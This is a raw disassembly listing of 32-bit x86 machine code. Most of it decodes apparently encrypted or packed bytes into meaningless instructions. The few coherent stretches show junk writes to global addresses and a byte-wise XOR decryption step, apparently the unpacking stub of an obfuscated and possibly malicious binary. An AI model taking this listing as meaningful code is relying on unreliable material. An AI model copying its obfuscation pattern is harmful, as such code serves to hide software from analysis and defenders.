  4082e5:	imul   edi,DWORD PTR [ecx-0x77],0xfffffff7
  4082e9:	jg     0x40828d
  4082eb:	lahf   
  4082ec:	or     esi,ecx
  4082ee:	mov    ds:0xa252b1be,eax
  4082f3:	(bad)  
  4082f4:	add    eax,0x5d8a4a27
  4082f9:	jo     0x408352
  4082fb:	imul   edi,DWORD PTR [ebx-0x53584f2a],0xffffffdb
  408302:	(bad)  
  408303:	(bad)  
  408304:	sti    
  408305:	inc    ebp
  408306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408307:	mov    ds:0x58b1d589,al
  40830c:	pop    es
  40830d:	mov    al,0xbe
  40830f:	jae    0x4082ca
  408311:	loopne 0x408365
  408313:	pop    eax
  408314:	inc    esp
  408315:	int3   
  408316:	pop    esp
  408317:	rcr    DWORD PTR [edx],0xf8
  40831a:	cli    
  40831b:	icebp  
  40831c:	sbb    BYTE PTR [edi-0x26a89820],ah
  408322:	mov    ecx,DWORD PTR [ebp-0x2c]
  408325:	shrd   eax,ecx,0x2
  408329:	cmp    DWORD PTR ds:0x422946,0x0
  408330:	movzx  edx,WORD PTR ds:0x4228f2
  408337:	mov    DWORD PTR ds:0x42291a,0x73f0
  408341:	mov    DWORD PTR ds:0x4228a6,0x5bc0
  40834b:	mov    DWORD PTR ds:0x4228a6,edi
  408351:	jmp    0x4083c2
  408356:	mov    DWORD PTR ds:0x422966,0x16dc
  408360:	ja     0x40839a
  408366:	push   0x7c34
  40836b:	push   0x2548
  408370:	push   0x422922
  408375:	push   0x4229d2
  40837a:	call   DWORD PTR ds:0x42a04c
  408380:	adc    DWORD PTR ds:0x4229b2,ebx
  408386:	or     DWORD PTR ds:0x422956,0x2706
  408390:	mov    DWORD PTR ds:0x42293e,0x85d
  40839a:	and    edx,DWORD PTR ds:0x4228ee
  4083a0:	mov    DWORD PTR ds:0x422892,0x217b
  4083aa:	mov    edx,DWORD PTR ds:0x422ae2
  4083b0:	mov    edx,DWORD PTR [edx]
  4083b2:	sub    DWORD PTR ds:0x422956,edx
  4083b8:	add    DWORD PTR ds:0x4228b6,0x6a28
  4083c2:	shr    ecx,0x2
  4083c5:	or     DWORD PTR ds:0x4229c2,0x19bb
  4083cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4083d2:	mov    edx,DWORD PTR [ebp-0x2c]
  4083d5:	xor    eax,edi
  4083d7:	shl    ecx,0x1e
  4083da:	and    ecx,0x262b
  4083e0:	xor    edx,edx
  4083e2:	or     eax,edx
  4083e4:	lea    eax,[ebp+eax*1-0x4]
  4083e8:	sbb    edx,ecx
  4083ea:	mov    DWORD PTR [ebp-0x34],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x30]
  4083f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4083f3:	and    DWORD PTR ds:0x4228b2,ebx
  4083f9:	shrd   eax,ecx,0x2
  4083fd:	mov    edx,DWORD PTR ds:0x42292e
  408403:	sub    DWORD PTR ds:0x4228fa,edx
  408409:	shr    ecx,0x2
  40840c:	or     ecx,ecx
  40840e:	jmp    0x408998
  408413:	xchg   edi,eax
  408414:	xchg   dl,bl
  408416:	(bad)  
  408418:	pop    ecx
  408419:	test   BYTE PTR [eax+0x3e],bl
  40841c:	mov    esi,0x8cd1a8d4
  408421:	shr    BYTE PTR [esi+0x4b],1
  408424:	dec    ebp
  408425:	push   ss
  408426:	push   ss
  408427:	cmp    eax,0xea161604
  40842c:	fidivr DWORD PTR ds:0xd8ffca2c
  408432:	jl     0x408485
  408434:	add    ebx,DWORD PTR [eax]
  408436:	es imul ecx,esi,0xffffffeb
  40843a:	stc    
  40843b:	ficom  DWORD PTR [ebx]
  40843d:	stos   BYTE PTR es:[edi],al
  40843e:	jno    0x40843f
  408440:	xor    esi,esp
  408442:	sbb    eax,0xedf3d22f
  408447:	fwait
  408448:	(bad)  
  408449:	sbb    dh,ch
  40844b:	ret    0x6f5d
  40844e:	and    al,cl
  408450:	das    
  408451:	mov    ecx,0xe3fc1c19
  408456:	int3   
  408457:	xchg   ebx,eax
  408458:	addr16 mov edi,0x32621159
  40845e:	mov    eax,0x60461cb3
  408463:	rcr    bl,1
  408465:	mov    es,WORD PTR [edi+0x33]
  408468:	mov    eax,ds:0xe291cdb
  40846d:	lea    eax,[ebp-0x1c1268ad]
  408473:	dec    esp
  408474:	pop    es
  408475:	jge    0x408489
  408477:	repnz xor eax,0x245df389
  40847d:	adc    bl,BYTE PTR [eax]
  40847f:	sub    al,0x2b
  408481:	adc    eax,0xbcc6fe71
  408486:	aaa    
  408487:	fmul   st,st(5)
  408489:	mov    al,ds:0x6a74cb1
  40848e:	call   0xf787:0x62f7c3d9
  408495:	xchg   edi,eax
  408496:	pop    edi
  408497:	popa   
  408498:	fwait
  408499:	les    edi,FWORD PTR [ecx]
  40849b:	push   ss
  40849c:	addr16 sbb eax,0x26bb10f5
  4084a2:	fldenv [edi-0x11]
  4084a5:	add    dh,BYTE PTR [edi-0x432a3ac1]
  4084ab:	jbe    0x40846d
  4084ad:	stos   DWORD PTR es:[edi],eax
  4084ae:	ret    0xadf9
  4084b1:	test   eax,0x4717ffa3
  4084b6:	leave  
  4084b7:	iret   
  4084b8:	mov    fs,esp
  4084ba:	ret    0xe686
  4084bd:	sbb    DWORD PTR [ecx+0x2df41287],edx
  4084c3:	pusha  
  4084c4:	add    al,0x1
  4084c6:	mov    WORD PTR [ebx-0x37],ss
  4084c9:	icebp  
  4084ca:	push   ebx
  4084cb:	shr    BYTE PTR [eax-0x193950b5],0x22
  4084d2:	pop    edx
  4084d3:	out    dx,al
  4084d4:	mov    ds:0xb09d1e78,eax
  4084d9:	or     DWORD PTR [eax-0x3d],edi
  4084dc:	test   ecx,esp
  4084de:	add    al,0x12
  4084e0:	push   cs
  4084e1:	ss inc edx
  4084e3:	(bad)  
  4084e5:	mov    dl,0x9d
  4084e7:	xchg   edx,eax
  4084e8:	mov    bh,0xc9
  4084ea:	scas   al,BYTE PTR es:[edi]
  4084eb:	inc    eax
  4084ec:	cdq    
  4084ed:	cmc    
  4084ee:	dec    edi
  4084ef:	adc    edx,edi
  4084f1:	pop    es
  4084f2:	(bad)  
  4084f3:	enter  0x1068,0x74
  4084f7:	pop    eax
  4084f8:	pop    es
  4084f9:	xlat   BYTE PTR ds:[ebx]
  4084fa:	ffree  st(4)
  4084fc:	aad    0x54
  4084fe:	das    
  4084ff:	cmp    ebp,DWORD PTR [edx-0x585c04f2]
  408505:	aas    
  408506:	add    eax,0x192f2472
  40850b:	cmp    ebp,DWORD PTR [ebx+0x21fcb00a]
  408511:	cmp    DWORD PTR [edi-0x9],ecx
  408514:	lds    edx,FWORD PTR [ebx+0x15]
  408517:	lahf   
  408518:	dec    ebx
  408519:	sbb    BYTE PTR [edi-0x4cae4655],dh
  40851f:	lock inc eax
  408521:	adc    al,0xd0
  408523:	(bad)  [ecx]
  408525:	jmp    0x40859c
  408527:	adc    DWORD PTR [ecx-0x760e9a1],esp
  40852d:	jmp    0x2f81:0x9ceb3869
  408534:	pop    ss
  408535:	and    al,0xad
  408537:	mov    esi,0x1b87658c
  40853c:	shr    DWORD PTR [ecx],1
  40853e:	repz add eax,0x6e2c380a
  408544:	and    BYTE PTR [edx+0x6bc520d3],cl
  40854a:	call   0xd94a:0xde8b5c86
  408551:	sbb    bl,BYTE PTR [esi+0x3b]
  408554:	loopne 0x40859a
  408556:	cmp    edx,DWORD PTR [esi-0x28f5c895]
  40855c:	ror    BYTE PTR [eax-0x1e220a03],0xee
  408563:	test   al,0x92
  408565:	inc    edx
  408566:	xor    edx,DWORD PTR [ecx-0x127a5f1d]
  40856c:	xchg   DWORD PTR [ebx+0x18fa691c],ebp
  408572:	inc    eax
  408573:	punpckhwd mm0,QWORD PTR [edx-0x17]
  408577:	out    dx,eax
  408578:	push   0x553dab83
  40857d:	adc    edx,DWORD PTR [esi-0x64271bc9]
  408583:	and    eax,0x7392d956
  408588:	stos   BYTE PTR es:[edi],al
  408589:	dec    ebp
  40858a:	xchg   esp,eax
  40858b:	push   edi
  40858c:	jno    0x4085ab
  40858e:	fsubr  QWORD PTR [ebp+0x2e]
  408591:	mov    dh,0x31
  408593:	mov    bh,0xba
  408595:	hlt    
  408596:	fld    DWORD PTR [ecx+esi*1-0x222138f4]
  40859d:	push   eax
  40859e:	inc    ecx
  40859f:	inc    edi
  4085a0:	pop    eax
  4085a1:	retf   
  4085a2:	aam    0xb7
  4085a4:	stos   DWORD PTR es:[edi],eax
  4085a5:	mov    ecx,esp
  4085a7:	or     BYTE PTR [ecx-0x88cf50e],0xf5
  4085ae:	popf   
  4085af:	cwde   
  4085b0:	or     al,0x81
  4085b2:	fisub  DWORD PTR [edx]
  4085b4:	pushf  
  4085b5:	leave  
  4085b6:	mov    bl,0x49
  4085b8:	cld    
  4085b9:	dec    esi
  4085ba:	cmp    al,0x72
  4085bc:	int3   
  4085bd:	es call 0x34ccd6ca
  4085c3:	sub    dh,ch
  4085c5:	int    0x3c
  4085c7:	push   esp
  4085c8:	jl     0x4085f3
  4085ca:	push   ss
  4085cb:	jae    0x40855a
  4085cd:	and    cl,BYTE PTR [eax+0x31]
  4085d0:	pop    ebx
  4085d1:	jmp    0x7a6c:0x84cc2bba
  4085d8:	cdq    
  4085d9:	bound  eax,QWORD PTR [edi]
  4085db:	fs sub eax,0xa7aebfee
  4085e1:	aam    0xe
  4085e3:	sbb    esp,DWORD PTR [edi+0x40dd304]
  4085e9:	dec    edx
  4085ea:	test   BYTE PTR [esi-0x2ea24fe2],al
  4085f0:	adc    BYTE PTR [edi],bl
  4085f2:	fyl2xp1 
  4085f4:	cmp    ebx,DWORD PTR ds:0xc264ffaf
  4085fa:	gs sti 
  4085fc:	hlt    
  4085fd:	mov    ebx,0x909ea069
  408602:	jne    0x408633
  408604:	int    0x3f
  408606:	xchg   esi,eax
  408607:	call   0x62966f61
  40860c:	adc    eax,0x8e072bda
  408611:	imul   eax,DWORD PTR [ebp+eax*4-0x53e82860],0x86666061
  40861c:	pop    ss
  40861d:	xchg   ebx,eax
  40861e:	out    0xe8,eax
  408620:	cmc    
  408621:	inc    edx
  408622:	mov    ch,0xeb
  408624:	pushf  
  408625:	mov    ch,0xc7
  408627:	mov    DWORD PTR [edi],esp
  408629:	cmp    BYTE PTR [eax+eiz*1],ch
  40862c:	icebp  
  40862d:	(bad)  [eax+0x16]
  408630:	pop    ecx
  408631:	add    eax,ecx
  408633:	fisubr WORD PTR [esi-0x1f7aadae]
  408639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863a:	xchg   esp,eax
  40863b:	stos   DWORD PTR es:[edi],eax
  40863c:	fld    QWORD PTR cs:[edx]
  40863f:	mov    dl,0x10
  408641:	push   edi
  408642:	jle    0x4085ca
  408644:	pusha  
  408645:	push   ds
  408646:	rcr    dl,1
  408648:	test   DWORD PTR [ecx-0x2ea5119e],ebp
  40864e:	xchg   esi,eax
  40864f:	add    bl,BYTE PTR [edi-0x4d11060]
  408655:	je     0x408605
  408657:	test   DWORD PTR [ecx-0x5e],edi
  40865a:	and    esi,esp
  40865c:	test   eax,0x8ea1b6f4
  408661:	cmp    DWORD PTR [ebx+0x9],ecx
  408664:	add    BYTE PTR [ecx-0x63],ah
  408667:	icebp  
  408668:	retf   
  408669:	enter  0x9741,0x97
  40866d:	pop    ebp
  40866e:	jne    0x408621
  408670:	bound  ebx,QWORD PTR [edi-0x2d]
  408673:	sti    
  408674:	pop    eax
  408675:	data16 add al,0x9d
  408678:	mov    ds:0x7d7e4e98,al
  40867d:	lock push edi
  40867f:	push   es
  408680:	loope  0x4086f7
  408682:	loop   0x4086d9
  408684:	fs int3 
  408686:	jge    0x4086f2
  408688:	pop    es
  408689:	pop    ecx
  40868a:	pushf  
  40868b:	data16 cmp bl,ah
  40868e:	ficom  DWORD PTR [ecx+0x37]
  408691:	shr    DWORD PTR [esi+0x4cc17426],0xe4
  408698:	sbb    eax,0xfd5cda58
  40869d:	mov    edx,DWORD PTR [ecx+0x24712814]
  4086a3:	xor    eax,0x68c3ef5a
  4086a8:	in     eax,dx
  4086a9:	mov    edx,0x62db92f4
  4086ae:	xchg   DWORD PTR [esi+0x28778d5b],eax
  4086b4:	jo     0x4086ee
  4086b6:	les    esi,FWORD PTR [eax+edi*1-0x1faea890]
  4086bd:	cmc    
  4086be:	push   ebx
  4086bf:	cli    
  4086c0:	into   
  4086c1:	fucomp st(5)
  4086c3:	xor    BYTE PTR [edx],bl
  4086c5:	leave  
  4086c6:	mov    edx,0x40eb11a1
  4086cb:	xchg   edi,eax
  4086cc:	bound  sp,DWORD PTR [esi*1+0x25ddbc74]
  4086d4:	dec    cl
  4086d6:	sbb    eax,0xe02624c5
  4086db:	jg     0x4086fd
  4086dd:	cwde   
  4086de:	mul    DWORD PTR [ebp-0x6e4d48bd]
  4086e4:	jmp    0x4bf:0xb96ff118
  4086eb:	or     dh,BYTE PTR [ecx+ecx*8]
  4086ee:	mov    bh,0x3b
  4086f0:	push   eax
  4086f1:	jno    0x408701
  4086f3:	xor    BYTE PTR [ebx+0x42],0xfb
  4086f7:	mov    ds:0x83f23138,eax
  4086fc:	xlat   BYTE PTR ds:[ebx]
  4086fd:	jmp    0x44783462
  408702:	setl   dh
  408705:	mov    cl,0x22
  408707:	or     eax,0xb1339941
  40870c:	lods   al,BYTE PTR ds:[esi]
  40870d:	sbb    DWORD PTR [ebx+ecx*1],esi
  408710:	fldcw  WORD PTR [eax+edi*1+0x411b6a6a]
  408717:	inc    eax
  408718:	les    esp,FWORD PTR [ecx+0x7bb22bc5]
  40871e:	mov    eax,ds:0xe1d0f47e
  408723:	call   0x2254be77
  408728:	pop    ecx
  408729:	adc    eax,0xd5fbdcb7
  40872e:	jl     0x40878b
  408730:	idiv   BYTE PTR [edx-0x630f56ba]
  408736:	or     BYTE PTR [ebx-0x52],0x27
  40873a:	xchg   ebx,eax
  40873b:	jae    0x40879a
  40873d:	loope  0x408766
  40873f:	push   ss
  408740:	jo     0x4086df
  408742:	add    edi,DWORD PTR [edi]
  408744:	xchg   edi,eax
  408745:	mov    al,BYTE PTR [eax+0x69]
  408748:	dec    ebp
  408749:	xor    bl,cl
  40874b:	retf   
  40874c:	std    
  40874d:	push   ss
  40874e:	add    dh,bl
  408750:	shl    DWORD PTR [esi],0xc6
  408753:	and    BYTE PTR [edi+0x66],al
  408756:	mov    eax,ds:0x7c44ff45
  40875b:	pushf  
  40875c:	mov    bh,0xeb
  40875e:	xlat   BYTE PTR ds:[ebx]
  40875f:	mov    edi,0x738ebcab
  408764:	les    eax,FWORD PTR [edi+0x76a951a]
  40876a:	mov    DWORD PTR [edi+0x1f],eax
  40876d:	jge    0x408756
  40876f:	(bad)  
  408770:	pop    esi
  408771:	in     al,0xb1
  408773:	jg     0x4087d1
  408775:	sub    dh,dh
  408777:	scas   al,BYTE PTR es:[edi]
  408778:	loop   0x40870c
  40877a:	sbb    ebp,DWORD PTR [ecx-0x21]
  40877d:	xchg   ebp,eax
  40877e:	mov    ecx,0xab3cef25
  408783:	jg     0x4087b0
  408785:	in     eax,0xd4
  408787:	mov    ?,WORD PTR ds:0xa4f5638f
  40878d:	xchg   edx,eax
  40878e:	pop    ebx
  40878f:	inc    esp
  408790:	jp     0x408790
  408792:	aas    
  408793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408794:	dec    edi
  408795:	imul   edx,DWORD PTR [eax-0x68b61825],0xc4a08ca3
  40879f:	imul   edi,DWORD PTR [ebp+0x1d53957],0x35
  4087a6:	pushf  
  4087a7:	and    DWORD PTR [esp+esi*8],eax
  4087aa:	ja     0x4087d6
  4087ac:	adc    DWORD PTR [eax+0x7f],eax
  4087af:	mov    dh,0xbb
  4087b1:	push   eax
  4087b2:	out    0x9c,al
  4087b4:	inc    DWORD PTR [edi+ebx*8]
  4087b7:	repnz adc BYTE PTR [ebx-0x39873259],ch
  4087be:	or     eax,0xdd5fef6f
  4087c3:	retf   0x927f
  4087c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087c7:	pop    edx
  4087c8:	inc    esi
  4087c9:	inc    ebx
  4087ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087cb:	shl    BYTE PTR [ebp-0xbb29761],1
  4087d1:	les    ecx,FWORD PTR [ebx-0x77]
  4087d4:	mov    edx,0x47e0ae8f
  4087d9:	xchg   esp,eax
  4087da:	test   al,0x19
  4087dc:	xchg   ebx,eax
  4087dd:	push   ecx
  4087de:	or     esi,DWORD PTR [edi+0x6079176b]
  4087e4:	adc    DWORD PTR [edx+0x7e],edx
  4087e7:	adc    eax,0x86945ed8
  4087ec:	(bad)  [esi+0x3f401f94]
  4087f2:	sbb    al,0xa2
  4087f4:	dec    eax
  4087f5:	cdq    
  4087f6:	inc    ebx
  4087f7:	pop    ecx
  4087f8:	push   cs
  4087f9:	cwde   
  4087fa:	mov    ds:0x993c6e1c,eax
  4087ff:	in     eax,0x29
  408801:	int3   
  408802:	sbb    al,0xab
  408804:	inc    ebp
  408805:	mov    ebx,DWORD PTR [esp]
  408808:	or     DWORD PTR [edx+0x17],edx
  40880b:	push   ecx
  40880c:	sbb    eax,0x84854582
  408811:	mov    bh,BYTE PTR [edx-0x26]
  408814:	cmp    bl,BYTE PTR [esp+esi*2-0x16035c0a]
  40881b:	(bad)
  40881e:	fstp   DWORD PTR [ecx]
  408820:	stos   BYTE PTR es:[edi],al
  408821:	jno    0x40880e
  408823:	xchg   dh,ah
  408825:	sbb    al,0xfb
  408827:	test   eax,0x1dac48cb
  40882c:	or     al,0x87
  40882e:	not    BYTE PTR [esi]
  408830:	js     0x4087da
  408832:	sub    BYTE PTR [ebp-0x2f],0xcc
  408836:	push   cs
  408837:	sub    DWORD PTR [edx+ebx*8],ecx
  40883a:	cwde   
  40883b:	pop    edx
  40883c:	push   ecx
  40883d:	ror    DWORD PTR [ebx+edi*8],0x97
  408841:	mov    ds:0x167d8366,eax
  408846:	push   ebx
  408847:	into   
  408848:	call   0x9b67549c
  40884d:	or     DWORD PTR [ebp-0x47],esi
  408850:	adc    DWORD PTR [edi],ebx
  408852:	inc    esi
  408853:	mov    ds:0x1102da1b,eax
  408858:	mov    ebx,0x3fa9e889
  40885d:	pop    es
  40885e:	dec    esi
  40885f:	ds fs call 0x15490f21
  408866:	(bad)  
  408867:	adc    bh,al
  408869:	ret    0xc821
  40886c:	shl    DWORD PTR [ebx-0x71],0x4c
  408870:	xor    DWORD PTR ds:0x4f4fb66a,0xce609f19
  40887a:	cmp    al,0xa9
  40887c:	mov    esi,0x39cf90ca
  408881:	add    DWORD PTR [edi-0x10],ebp
  408884:	sub    al,0xe3
  408886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408887:	mov    ebx,0x1168dc9d
  40888c:	xchg   esi,eax
  40888d:	test   eax,0x557739e5
  408892:	in     eax,0xa
  408894:	dec    ecx
  408895:	sbb    DWORD PTR [eax+esi*2+0x1b],esi
  408899:	pop    ecx
  40889a:	jmp    DWORD PTR [edx+edi*1-0x44]
  40889e:	fwait
  40889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a0:	add    ch,BYTE PTR [edx-0x3e]
  4088a3:	and    al,0x1a
  4088a5:	and    ah,BYTE PTR [eax+0x73]
  4088a8:	mov    ebp,0xa0a1a08b
  4088ad:	ss push edi
  4088af:	aad    0xab
  4088b1:	push   esi
  4088b2:	sbb    al,0xe1
  4088b4:	and    bl,0xcd
  4088b7:	or     bh,BYTE PTR [edx]
  4088b9:	shr    BYTE PTR [ebx],0x69
  4088bc:	inc    ecx
  4088bd:	test   eax,0xf605663d
  4088c2:	jno    0x408908
  4088c4:	movsx  esp,WORD PTR [edx]
  4088c7:	jb     0x40886e
  4088c9:	popf   
  4088ca:	and    BYTE PTR [edx-0x53],dl
  4088cd:	or     eax,0xcd06fd70
  4088d2:	cmc    
  4088d3:	or     dh,ch
  4088d5:	stos   DWORD PTR es:[edi],eax
  4088d6:	lods   al,BYTE PTR ds:[esi]
  4088d7:	mov    ebp,0x8be45f38
  4088dc:	cld    
  4088dd:	repz cmp cl,BYTE PTR [edx+0x24]
  4088e1:	outs   dx,DWORD PTR ds:[esi]
  4088e2:	pop    es
  4088e3:	es pop ds
  4088e5:	scas   al,BYTE PTR es:[edi]
  4088e6:	aas    
  4088e7:	out    dx,eax
  4088e8:	cmc    
  4088e9:	in     eax,dx
  4088ea:	loope  0x4088fe
  4088ec:	xchg   edx,eax
  4088ed:	lahf   
  4088ee:	mov    ebp,0xdabdd6fa
  4088f3:	ret    
  4088f4:	enter  0x1e32,0xd6
  4088f8:	sar    BYTE PTR [ecx-0x6fd0c982],cl
  4088fe:	push   ss
  4088ff:	mov    ch,0xbf
  408901:	mov    bl,0x83
  408903:	mov    ebx,0x337a53e3
  408908:	jns    0x40893d
  40890a:	idiv   BYTE PTR [edi+ebp*1-0x5a]
  40890e:	fs inc esi
  408910:	cld    
  408911:	sub    DWORD PTR [ecx+ecx*4-0x363637e8],ebp
  408918:	sbb    ebp,DWORD PTR [ecx-0x52a80455]
  40891e:	aam    0xf9
  408920:	shl    DWORD PTR [edx+0x2d],cl
  408923:	ins    BYTE PTR es:[edi],dx
  408924:	push   0x93cf8243
  408929:	out    0x2e,al
  40892b:	adc    al,ch
  40892d:	out    dx,al
  40892e:	cmp    edx,edx
  408930:	ins    DWORD PTR es:[edi],dx
  408931:	xchg   ebp,eax
  408932:	mov    edx,0x7c52420d
  408937:	gs enter 0x1da0,0x43
  40893c:	clc    
  40893d:	xor    eax,0x322668e7
  408942:	mov    dl,0x73
  408944:	xor    eax,0x29840a55
  408949:	ror    DWORD PTR [edi+0x1e05e618],1
  40894f:	pop    es
  408950:	imul   edi,edx,0x2ab03309
  408956:	push   ss
  408957:	test   BYTE PTR [esp+ecx*4+0x77],0xf0
  40895c:	scas   eax,DWORD PTR es:[edi]
  40895d:	mov    BYTE PTR [ebx-0x35],cl
  408960:	pusha  
  408961:	call   0x46cb:0x2b225478
  408968:	dec    ebp
  408969:	fs loopne 0x4088fa
  40896c:	data16 cld 
  40896e:	pusha  
  40896f:	jne    0x40891b
  408971:	mov    ds:0x97ed49f2,al
  408976:	int    0x85
  408978:	cdq    
  408979:	xor    al,0x7e
  40897b:	push   0x9196dbb6
  408980:	pop    ebp
  408981:	xchg   ebx,eax
  408982:	xchg   ecx,eax
  408983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408984:	push   eax
  408985:	push   ebp
  408986:	mov    esi,0xdb400ff5
  40898b:	aam    0x98
  40898d:	sub    eax,ebx
  40898f:	cmc    
  408990:	push   esp
  408991:	jns    0x408994
  408993:	sub    ah,BYTE PTR [ebx-0x74b3d1b6]
  408999:	dec    ebp
  40899a:	ror    BYTE PTR [ebx+0x1581d455],1
  4089a0:	dec    edx
  4089a1:	sub    DWORD PTR [edx+0x0],eax
  4089a4:	call   FWORD PTR [edi]
  4089a6:	add    BYTE PTR [eax],al
  4089a8:	shl    ecx,0x1e
  4089ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4089ae:	xor    eax,edi
  4089b0:	xor    edx,edx
  4089b2:	sbb    DWORD PTR ds:0x4228c2,0x5606
  4089bc:	or     eax,edx
  4089be:	mov    cl,BYTE PTR [eax+ecx*1]
  4089c1:	mov    eax,DWORD PTR [ebp-0x34]
  4089c4:	or     edx,DWORD PTR ds:0x42290e
  4089ca:	xor    BYTE PTR [eax],cl
  4089cc:	mov    eax,DWORD PTR [ebp-0x20]
  4089cf:	sub    DWORD PTR ds:0x422932,0x6c12
  4089d9:	jmp    0x408f63
  4089de:	in     eax,dx
  4089df:	imul   ebx,eax,0x7d
  4089e2:	pop    eax
  4089e3:	je     0x408a4d
  4089e5:	pop    edx
  4089e6:	mov    ds:0x7372b232,eax
  4089eb:	test   al,0xb6
  4089ed:	scas   al,BYTE PTR es:[edi]
  4089ee:	add    BYTE PTR [ebx+0x16],0x16
  4089f2:	cmp    eax,0xc8161604
  4089f7:	xchg   ecx,eax
  4089f8:	iret   
  4089f9:	sub    eax,0xe7ce1809
  4089fe:	and    eax,0xf989b5de
  408a03:	hlt    
  408a04:	dec    esi
  408a05:	mov    ch,0x1e
  408a07:	call   0xb7bdee7f
  408a0c:	xor    eax,0xc9266333
  408a11:	enter  0xfacd,0x9f
  408a15:	loopne 0x4089fa
  408a17:	std    
  408a18:	shl    BYTE PTR [edi],1
  408a1a:	xchg   BYTE PTR [eax],bh
  408a1c:	cmc    
  408a1d:	add    bh,BYTE PTR [esp+edi*4+0x66b33be]
  408a24:	idiv   BYTE PTR ds:0x42386534
  408a2a:	xchg   edx,eax
  408a2b:	xchg   ecx,eax
  408a2c:	jecxz  0x408a64
  408a2e:	add    DWORD PTR [ecx+0x3626336c],0x465c2fa1
  408a38:	xor    DWORD PTR ds:0xebe98b59,esi
  408a3e:	mov    cl,0x98
  408a40:	rcr    DWORD PTR [eax-0x1b],1
  408a43:	(bad)  
  408a44:	test   DWORD PTR [eax+0x37],0x98d63797
  408a4b:	mov    eax,0x93c6ad9b
  408a50:	push   edi
  408a51:	sbb    al,0x72
  408a53:	jae    0x408a5d
  408a55:	push   es
  408a56:	neg    DWORD PTR [esi+0x64]
  408a59:	and    DWORD PTR [ecx],ebx
  408a5b:	sub    edx,DWORD PTR [eax-0x33]
  408a5e:	and    DWORD PTR [esi-0x36],edx
  408a61:	xor    eax,0xf98fb97e
  408a66:	sbb    ebp,DWORD PTR [esp+esi*2+0x28]
  408a6a:	sub    dl,0x52
  408a6d:	mov    ch,BYTE PTR [ebx*8-0x216b5903]
  408a74:	loope  0x408ab3
  408a76:	sti    
  408a77:	push   0x6b2aa5be
  408a7c:	addr16 cwde 
  408a7e:	aaa    
  408a7f:	sbb    al,0xcb
  408a81:	out    dx,eax
  408a82:	(bad)
  408a86:	sub    DWORD PTR [edi+0x2b3e06cf],esi
  408a8c:	inc    ecx
  408a8d:	sbb    bh,BYTE PTR [ebx]
  408a8f:	push   cs
  408a90:	mov    dh,0xf9
  408a92:	clc    
  408a93:	jl     0x408a5f
  408a95:	or     BYTE PTR [edi],dh
  408a97:	mov    eax,0xaff186b7
  408a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a9d:	sbb    esp,ebp
  408a9f:	addr16 ret 0x74e3
  408aa3:	outs   dx,BYTE PTR ds:[esi]
  408aa4:	cs inc edi
  408aa6:	add    DWORD PTR [ebx],esi
  408aa8:	gs push es
  408aaa:	mov    dl,0xe7
  408aac:	stc    
  408aad:	xor    eax,0xd281cfcc
  408ab2:	int    0xa3
  408ab4:	cld    
  408ab5:	inc    ebx
  408ab6:	push   esi
  408ab7:	outs   dx,BYTE PTR ds:[esi]
  408ab8:	xchg   edx,eax
  408ab9:	pop    ecx
  408aba:	test   eax,0xb5ace40f
  408abf:	adc    BYTE PTR [ebx-0x73],dh
  408ac2:	mov    ecx,0x2fb5d9bc
  408ac7:	jl     0x408afe
  408ac9:	fcomi  st,st(6)
  408acb:	(bad)  
  408acd:	das    
  408ace:	data16 and al,0xaf
  408ad1:	ret    0x6a31
  408ad4:	ja     0x408a94
  408ad6:	add    al,0x26
  408ad8:	dec    ecx
  408ad9:	dec    esp
  408ada:	bnd jmp 0x408a61
  408add:	stos   BYTE PTR es:[edi],al
  408ade:	scas   al,BYTE PTR es:[edi]
  408adf:	push   edx
  408ae0:	push   eax
  408ae1:	xchg   ebx,eax
  408ae2:	jge    0x408b48
  408ae4:	sbb    DWORD PTR ds:0x9e5b43f0,ebx
  408aea:	pop    edx
  408aeb:	loop   0x408af9
  408aed:	mov    ds:0x4e4b971e,eax
  408af2:	fs cmc 
  408af4:	int    0xfb
  408af6:	adc    ch,dh
  408af8:	add    al,0x47
  408afa:	jb     0x408ac4
  408afc:	or     DWORD PTR [edi+ecx*1-0x312cf7a3],edx
  408b03:	mov    WORD PTR [edx-0x4d61566d],es
  408b09:	mov    dl,0x71
  408b0b:	xor    BYTE PTR [edx+0x7a],0x29
  408b0f:	xchg   edi,eax
  408b10:	pop    edi
  408b11:	sub    DWORD PTR [esi+0x1d],esp
  408b14:	jnp    0x408b25
  408b16:	arpl   WORD PTR [eax],cx
  408b18:	sahf   
  408b19:	test   eax,0xbd6f54ee
  408b1e:	pop    ss
  408b1f:	inc    edx
  408b20:	jmp    0x59ba54ba
  408b25:	sbb    esp,0xfe7bb48d
  408b2b:	div    BYTE PTR [esi]
  408b2d:	sub    al,ch
  408b2f:	cdq    
  408b30:	ror    BYTE PTR [eax-0x77],1
  408b33:	shr    DWORD PTR [edx],cl
  408b35:	cli    
  408b36:	je     0x408b74
  408b38:	ficomp DWORD PTR [edi]
  408b3a:	mov    ecx,0x74e98a4a
  408b3f:	mov    ds:0x4cf7323a,eax
  408b44:	das    
  408b45:	lods   eax,DWORD PTR ds:[esi]
  408b46:	mul    BYTE PTR [edi-0x3a6277c5]
  408b4c:	inc    esp
  408b4d:	enter  0xf406,0xfd
  408b51:	or     ecx,ebx
  408b53:	psubq  mm6,QWORD PTR es:[edx-0xc]
  408b58:	push   edx
  408b59:	ds imul ecx,esi,0x94b7922d
  408b60:	repnz imul esp,edi,0xffffff86
  408b64:	fnstcw WORD PTR [edx]
  408b66:	mov    bl,0x58
  408b68:	nop
  408b69:	dec    esi
  408b6a:	xchg   ebx,eax
  408b6b:	mov    ecx,0x87fe91a9
  408b70:	pop    es
  408b71:	lea    edx,[eax-0x75944169]
  408b77:	jns    0x408b61
  408b79:	imul   eax,edx,0xe1733df2
  408b7f:	mov    ds:0x8c97cd97,al
  408b84:	mov    dh,0x6c
  408b86:	sbb    BYTE PTR [edx-0xf575f4f],dl
